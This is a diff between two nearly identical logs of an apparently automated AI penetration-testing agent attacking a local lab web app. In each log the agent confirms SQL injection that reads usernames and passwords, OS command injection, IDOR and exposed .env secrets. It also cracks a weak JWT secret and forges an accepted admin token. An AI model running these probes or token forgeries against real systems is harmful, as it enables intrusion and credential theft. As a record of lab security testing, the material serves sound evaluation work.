@@ -1,50 +1,50 @@
-[02:48:19] session 20261113-024819-127.0.0.1 -> http://127.0.0.1:40523
-[02:48:19] agent: Baseline-diffed probes first: /item looks injectable, and the class needs the engine named plus a row from a table.
-[02:48:19] tool probe_sqli {"url": "http://127.0.0.1:40523/item?id=1", "param": "id", "union_cols": 6, "extract_table": "users", "extract_columns": "username,password"}
-[02:48:20]   -> {"result": {"verdict": "error-based candidate (xpath exfil - extracted value echoed in the error)", "signal": "sqlite3", "request_ids": {"base": "r1", "quote": "r2", "true": "r3", "false": "r4", "ntrue": "r5", "nfalse": "r6", "otrue": "r7", "ofalse": "r8", "notrue": "r9", "nofalse": "r10", "xpath": 
-[02:48:20] agent: Error channel named the engine; the bounded UNION read returned rows. Both go in the citation - the class needs the engine AND the data.
-[02:48:20] tool record_finding {"title": "SQL injection in /item id parameter", "severity": "critical", "category": "sqli", "url": "http://127.0.0.1:40523/item?id=1", "evidence_ids": ["r2", "r15"], "evidence_excerpt": "admin - $s3c
-[02:48:20]   -> {"result": {"recorded": "F01", "title": "SQL injection in /item id parameter", "severity": "critical", "vuln_class": "sqli", "grade": "proven", "requirement": "the DBMS fingerprint plus at least one row from a named table, bounded to what proves the read"}}
-[02:48:20] agent: A diagnostic endpoint takes a host - probe for command OUTPUT, not for a delay.
-[02:48:20] tool probe_cmdi {"url": "http://127.0.0.1:40523/ping?host=127.0.0.1", "param": "host"}
-[02:48:20]   -> {"result": {"nonce": "argus2q9y0t5r", "baseline_ms": 46.8, "results": [{"separator": "semicolon", "os": "unix", "request_id": "r18", "status": 200, "identity": "uid=1000(kali)", "marker_returned": true, "reflected_only": false}], "request_ids": {"semicolon/unix": "r18"}, "verdict": "command output r
-[02:48:20] agent: The host parameter reaches a shell: the identity line came back with the probe nonce.
-[02:48:20] tool record_finding {"title": "OS command injection in /ping host parameter", "severity": "critical", "category": "rce", "url": "http://127.0.0.1:40523/ping?host=127.0.0.1", "evidence_ids": ["r18"], "evidence_excerpt": "
-[02:48:20]   -> {"result": {"recorded": "F02", "title": "OS command injection in /ping host parameter", "severity": "critical", "vuln_class": "rce", "grade": "proven", "requirement": "the output of `id; echo <nonce>` returned by the target, with the nonce tying the output to the probe"}}
-[02:48:20] agent: Now the reflected-parameter family.
-[02:48:20] tool probe_reflection {"url": "http://127.0.0.1:40523/search?q=x", "param": "q"}
-[02:48:20]   -> {"result": {"request_id": "r19", "reflected": true, "verdict": "reflected", "context": "html", "unescaped_chars": ["<", ">", "\"", "'", "&"], "excerpt": "<html><body>Results for: xpgudsqw9<>'\"&=/</body></html>", "note": "context tells you the payload shape; unescaped < > \" ' means exploitable"}}
-[02:48:20] agent: Unescaped reflection. Recording it as what it is: a candidate, because nothing here executed it.
-[02:48:20] tool record_finding {"title": "Reflected XSS in /search q parameter", "severity": "medium", "category": "xss", "url": "http://127.0.0.1:40523/search?q=x", "evidence_excerpt": "<>'\"&=/", "description": "Canary chars < > 
-[02:48:20]   -> {"result": {"recorded": "F03", "title": "Reflected XSS in /search q parameter", "severity": "medium", "vuln_class": "xss", "grade": "candidate", "requirement": "a headless browser executing the payload and reporting the probe nonce", "missing": ["a real browser executed it"], "details": ["this syste
-[02:48:20] agent: Object-level authorization next.
-[02:48:20] tool probe_idor {"url": "http://127.0.0.1:40523/api/user/2"}
-[02:48:20]   -> {"result": {"verdict": "idor candidate: neighboring object ids return 200 with different content - verify the object isn't yours", "base_id": "r20", "results": [{"request_id": "r21", "status": 200, "similarity_to_base": 0.76, "accessible": true, "excerpt": "{\"id\": 3, \"username\": \"bob\", \"role\
-[02:48:20] agent: Two object ids, two principals, one of them not mine.
-[02:48:20] tool record_finding {"title": "IDOR: /api/user/<id> serves any user object", "severity": "high", "category": "idor", "url": "http://127.0.0.1:40523/api/user/2", "evidence_ids": ["r20", "r22"], "evidence_excerpt": "\"user
-[02:48:20]   -> {"result": {"recorded": "F04", "title": "IDOR: /api/user/<id> serves any user object", "severity": "high", "vuln_class": "idor", "grade": "proven", "requirement": "one actor reaching another's subject on the same endpoint, with subject-identifying data and nothing entitling the caller to it"}}
-[02:48:20] agent: Sensitive-artifact sweep before finishing.
-[02:48:20] tool probe_disclosure {"url": "http://127.0.0.1:40523"}
-[02:48:22]   -> {"result": {"verdict": "3 exposed sensitive path(s): /.git/HEAD, /.env, /debug", "checked": 37, "exposed": [{"path": "/.git/HEAD", "request_id": "r25", "bytes": 20, "signature": "^ref:\\s|^[0-9a-f]{40}"}, {"path": "/.env", "request_id": "r27", "bytes": 67, "signature": "^[A-Z_]+=|DB_|SECRET|TOKEN|KE
-[02:48:22] agent: Exposed secrets on the web root - recording.
-[02:48:22] tool record_finding {"title": "Exposed /.env and /.git/HEAD at web root", "severity": "medium", "category": "info-disclosure", "url": "http://127.0.0.1:40523/.env", "evidence_excerpt": "SECRET_KEY=lab-secret-0123", "desc
-[02:48:22]   -> {"result": {"recorded": "F05", "title": "Exposed /.env and /.git/HEAD at web root", "severity": "medium", "vuln_class": "disclosure", "grade": "proven", "requirement": "the credential or source observed in a response, quoted as the bytes that leaked"}}
-[02:48:22] agent: The session token itself is the next surface.
-[02:48:22] tool jwt_decode {"token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJ1c2VyIiwgImlhdCI6IDE3OTQ1NTYwOTl9.ucMGjAa5_TddDQVk6lgPXeauWqmNXSOaOdYOKpfRlrI"}
-[02:48:22]   -> {"result": {"header": {"alg": "HS256", "typ": "JWT"}, "payload": {"sub": "alice", "role": "user", "iat": 1794556099}, "recovered_secret": "secret123", "issues": ["weak HMAC secret recovered offline: 'secret123'"]}}
-[02:48:22] agent: Weak HMAC secret recovered offline - forge an admin token, then send a deliberately broken one as the control.
-[02:48:22] tool jwt_forge {"token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJ1c2VyIiwgImlhdCI6IDE3OTQ1NTYwOTl9.ucMGjAa5_TddDQVk6lgPXeauWqmNXSOaOdYOKpfRlrI", "claims": "{\"user\":\"admin\",\"
-[02:48:22]   -> {"result": {"resigned": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDU1NjA5OSwidXNlciI6ImFkbWluIn0.jhhWT96DV-J5yiP2HpeTk3BR7xu-w9zFPAgZCgGeC8o", "alg_none": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDU1NjA
-[02:48:22] tool http_request {"method": "GET", "url": "http://127.0.0.1:40523/api/me", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDU1NjA5OSwidXNl
-[02:48:22]   -> {"result": {"request_id": "r63", "status": 200, "elapsed_ms": 49.3, "headers": {"server": "LabVuln/1.0 Python/3.14.6", "date": "Fri, 13 Nov 2026 07:48:22 GMT", "content-type": "application/json", "x-powered-by": "LabVuln/1.0", "content-length": "93"}, "body": "{\"ok\": true, \"claims\": {\"sub\": \"
-[02:48:22] agent: The control: same request, signature broken by four bytes.
-[02:48:22] tool http_request {"method": "GET", "url": "http://127.0.0.1:40523/api/me", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDU1NjA5OSwidXNl
-[02:48:22]   -> {"result": {"request_id": "r64", "status": 401, "elapsed_ms": 45.7, "headers": {"server": "LabVuln/1.0 Python/3.14.6", "date": "Fri, 13 Nov 2026 07:48:22 GMT", "content-type": "application/json", "x-powered-by": "LabVuln/1.0", "content-length": "22"}, "body": "{\"error\": \"bad token\"}"}}
-[02:48:22] agent: Forged token accepted, deliberately invalid token rejected - and the forge event is cited too, because a working auth check looks the same on the wire.
-[02:48:22] tool record_finding {"title": "JWT weak secret: forged admin token accepted", "severity": "critical", "category": "jwt", "url": "http://127.0.0.1:40523/api/me", "evidence_ids": ["r64", "r63", "r62"], "evidence_excerpt": 
-[02:48:22]   -> {"result": {"recorded": "F06", "title": "JWT weak secret: forged admin token accepted", "severity": "critical", "vuln_class": "jwt", "grade": "proven", "requirement": "a credential this system minted, accepted on a privileged resource with its claims echoed back, and another credential refused on th
-[02:48:22] tool probe_xfh {"url": "http://127.0.0.1:40523/reset"}
-[02:48:22]   -> {"result": {"request_id": "r65", "canary": "xfhfcn1px1v.argus.invalid", "reflected_in": "body", "note": "reflection alone is a candidate. The xfh class needs the PAIR - the restricted path refused without the header and served with it - so pass `restricted` (e.g. /admin) and cite both request_ids", 
-[02:48:22] tool finish {"summary": "Demo run. Proven: SQL injection (engine named plus five rows from users), OS command injection (identity line with the probe nonce), IDOR across two principals, exposed secrets, and a for
-[02:48:22]   -> {"result": {"finished": true, "stats": {"requests": 65, "findings": 6, "elapsed_s": 3.0}}}
-[02:48:22] done in 17 turns; findings=6
+[22:18:17] session 20261115-221817-127.0.0.1 -> http://127.0.0.1:44939
+[22:18:17] agent: Baseline-diffed probes first: /item looks injectable, and the class needs the engine named plus a row from a table.
+[22:18:17] tool probe_sqli {"url": "http://127.0.0.1:44939/item?id=1", "param": "id", "union_cols": 6, "extract_table": "users", "extract_columns": "username,password"}
+[22:18:18]   -> {"result": {"verdict": "error-based candidate (xpath exfil - extracted value echoed in the error)", "signal": "sqlite3", "request_ids": {"base": "r1", "quote": "r2", "true": "r3", "false": "r4", "ntrue": "r5", "nfalse": "r6", "otrue": "r7", "ofalse": "r8", "notrue": "r9", "nofalse": "r10", "xpath": 
+[22:18:18] agent: Error channel named the engine; the bounded UNION read returned rows. Both go in the citation - the class needs the engine AND the data.
+[22:18:18] tool record_finding {"title": "SQL injection in /item id parameter", "severity": "critical", "category": "sqli", "url": "http://127.0.0.1:44939/item?id=1", "evidence_ids": ["r1", "r2", "r15"], "evidence_excerpt": "admin 
+[22:18:18]   -> {"result": {"recorded": "F01", "title": "SQL injection in /item id parameter", "severity": "critical", "vuln_class": "sqli", "grade": "proven", "requirement": "the DBMS fingerprint plus at least one row from a named table, bounded to what proves the read"}}
+[22:18:18] agent: A diagnostic endpoint takes a host - probe for command OUTPUT, not for a delay.
+[22:18:18] tool probe_cmdi {"url": "http://127.0.0.1:44939/ping?host=127.0.0.1", "param": "host"}
+[22:18:18]   -> {"result": {"nonce": "argusduvor2lu", "baseline_ms": 45.6, "results": [{"separator": "semicolon", "os": "unix", "request_id": "r18", "status": 200, "identity": "uid=1000(kali)", "marker_returned": true, "reflected_only": false}], "request_ids": {"semicolon/unix": "r18"}, "verdict": "command output r
+[22:18:18] agent: The host parameter reaches a shell: the identity line came back with the probe nonce.
+[22:18:18] tool record_finding {"title": "OS command injection in /ping host parameter", "severity": "critical", "category": "rce", "url": "http://127.0.0.1:44939/ping?host=127.0.0.1", "evidence_ids": ["r18"], "evidence_excerpt": "
+[22:18:18]   -> {"result": {"recorded": "F02", "title": "OS command injection in /ping host parameter", "severity": "critical", "vuln_class": "rce", "grade": "proven", "requirement": "the output of `id; echo <nonce>` returned by the target, with the nonce tying the output to the probe"}}
+[22:18:18] agent: Now the reflected-parameter family.
+[22:18:18] tool probe_reflection {"url": "http://127.0.0.1:44939/search?q=x", "param": "q"}
+[22:18:18]   -> {"result": {"request_id": "r19", "reflected": true, "verdict": "reflected", "context": "html", "unescaped_chars": ["<", ">", "\"", "'", "&"], "excerpt": "<html><body>Results for: xc8wionte<>'\"&=/</body></html>", "note": "context tells you the payload shape; unescaped < > \" ' means exploitable"}}
+[22:18:18] agent: Unescaped reflection. Recording it as what it is: a candidate, because nothing here executed it.
+[22:18:18] tool record_finding {"title": "Reflected XSS in /search q parameter", "severity": "medium", "category": "xss", "url": "http://127.0.0.1:44939/search?q=x", "evidence_excerpt": "<>'\"&=/", "description": "Canary chars < > 
+[22:18:18]   -> {"result": {"recorded": "F03", "title": "Reflected XSS in /search q parameter", "severity": "medium", "vuln_class": "xss", "grade": "candidate", "requirement": "a headless browser executing the payload and reporting the probe nonce", "missing": ["a real browser executed it"], "details": ["this syste
+[22:18:18] agent: Object-level authorization next.
+[22:18:18] tool probe_idor {"url": "http://127.0.0.1:44939/api/user/2"}
+[22:18:18]   -> {"result": {"verdict": "idor candidate: neighboring object ids return 200 with different content - verify the object isn't yours", "base_id": "r20", "results": [{"request_id": "r21", "status": 200, "similarity_to_base": 0.76, "accessible": true, "excerpt": "{\"id\": 3, \"username\": \"bob\", \"role\
+[22:18:18] agent: Two object ids, two principals, one of them not mine.
+[22:18:18] tool record_finding {"title": "IDOR: /api/user/<id> serves any user object", "severity": "high", "category": "idor", "url": "http://127.0.0.1:44939/api/user/2", "evidence_ids": ["r20", "r22"], "evidence_excerpt": "\"user
+[22:18:18]   -> {"result": {"recorded": "F04", "title": "IDOR: /api/user/<id> serves any user object", "severity": "high", "vuln_class": "idor", "grade": "proven", "requirement": "one actor reaching another's subject on the same endpoint, with subject-identifying data and nothing entitling the caller to it"}}
+[22:18:18] agent: Sensitive-artifact sweep before finishing.
+[22:18:18] tool probe_disclosure {"url": "http://127.0.0.1:44939"}
+[22:18:20]   -> {"result": {"verdict": "3 exposed sensitive path(s): /.git/HEAD, /.env, /debug", "checked": 37, "exposed": [{"path": "/.git/HEAD", "request_id": "r25", "bytes": 20, "signature": "^ref:\\s|^[0-9a-f]{40}"}, {"path": "/.env", "request_id": "r27", "bytes": 67, "signature": "^[A-Z_]+=|DB_|SECRET|TOKEN|KE
+[22:18:20] agent: Exposed secrets on the web root - recording.
+[22:18:20] tool record_finding {"title": "Exposed /.env and /.git/HEAD at web root", "severity": "medium", "category": "info-disclosure", "url": "http://127.0.0.1:44939/.env", "evidence_excerpt": "SECRET_KEY=lab-secret-0123", "desc
+[22:18:20]   -> {"result": {"recorded": "F05", "title": "Exposed /.env and /.git/HEAD at web root", "severity": "medium", "vuln_class": "disclosure", "grade": "proven", "requirement": "the credential or source observed in a response, quoted as the bytes that leaked"}}
+[22:18:20] agent: The session token itself is the next surface.
+[22:18:20] tool jwt_decode {"token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJ1c2VyIiwgImlhdCI6IDE3OTQ3OTkwOTd9.wFMUqOOgYc7Em5Y3bsMG33YvOvRjIyoCzlAE3D-M56A"}
+[22:18:20]   -> {"result": {"header": {"alg": "HS256", "typ": "JWT"}, "payload": {"sub": "alice", "role": "user", "iat": 1794799097}, "recovered_secret": "secret123", "issues": ["weak HMAC secret recovered offline: 'secret123'"]}}
+[22:18:20] agent: Weak HMAC secret recovered offline - forge an admin token, then send a deliberately broken one as the control.
+[22:18:20] tool jwt_forge {"token": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiYWxpY2UiLCAicm9sZSI6ICJ1c2VyIiwgImlhdCI6IDE3OTQ3OTkwOTd9.wFMUqOOgYc7Em5Y3bsMG33YvOvRjIyoCzlAE3D-M56A", "claims": "{\"user\":\"admin\",\"
+[22:18:20]   -> {"result": {"resigned": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDc5OTA5NywidXNlciI6ImFkbWluIn0.Gm7BPgmHTWmf5DWGZILDDDKl2a7aH2kxQgpzFwkV9nU", "alg_none": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDc5OTA
+[22:18:20] tool http_request {"method": "GET", "url": "http://127.0.0.1:44939/api/me", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDc5OTA5NywidXNl
+[22:18:20]   -> {"result": {"request_id": "r63", "status": 200, "elapsed_ms": 43.0, "headers": {"server": "LabVuln/1.0 Python/3.14.6", "date": "Mon, 16 Nov 2026 03:18:20 GMT", "content-type": "application/json", "x-powered-by": "LabVuln/1.0", "content-length": "93"}, "body": "{\"ok\": true, \"claims\": {\"sub\": \"
+[22:18:20] agent: The control: same request, signature broken by four bytes.
+[22:18:20] tool http_request {"method": "GET", "url": "http://127.0.0.1:44939/api/me", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDc5OTA5NywidXNl
+[22:18:20]   -> {"result": {"request_id": "r64", "status": 401, "elapsed_ms": 46.1, "headers": {"server": "LabVuln/1.0 Python/3.14.6", "date": "Mon, 16 Nov 2026 03:18:20 GMT", "content-type": "application/json", "x-powered-by": "LabVuln/1.0", "content-length": "22"}, "body": "{\"error\": \"bad token\"}"}}
+[22:18:20] agent: Forged token accepted, deliberately invalid token rejected - and the forge event is cited too, because a working auth check looks the same on the wire.
+[22:18:20] tool record_finding {"title": "JWT weak secret: forged admin token accepted", "severity": "critical", "category": "jwt", "url": "http://127.0.0.1:44939/api/me", "evidence_ids": ["r64", "r63", "r62"], "evidence_excerpt": 
+[22:18:20]   -> {"result": {"recorded": "F06", "title": "JWT weak secret: forged admin token accepted", "severity": "critical", "vuln_class": "jwt", "grade": "proven", "requirement": "a credential this system minted, accepted on a privileged resource with its claims echoed back, and another credential refused on th
+[22:18:20] tool probe_xfh {"url": "http://127.0.0.1:44939/reset"}
+[22:18:20]   -> {"result": {"request_id": "r65", "canary": "xfh8dp6yctq.argus.invalid", "reflected_in": "body", "note": "reflection alone is a candidate. The xfh class needs the PAIR - the restricted path refused without the header and served with it - so pass `restricted` (e.g. /admin) and cite both request_ids", 
+[22:18:20] tool finish {"summary": "Demo run. Proven: SQL injection (engine named plus five rows from users), OS command injection (identity line with the probe nonce), IDOR across two principals, exposed secrets, and a for
+[22:18:20]   -> {"result": {"finished": true, "stats": {"requests": 65, "findings": 6, "elapsed_s": 2.9}}}
+[22:18:20] done in 17 turns; findings=6
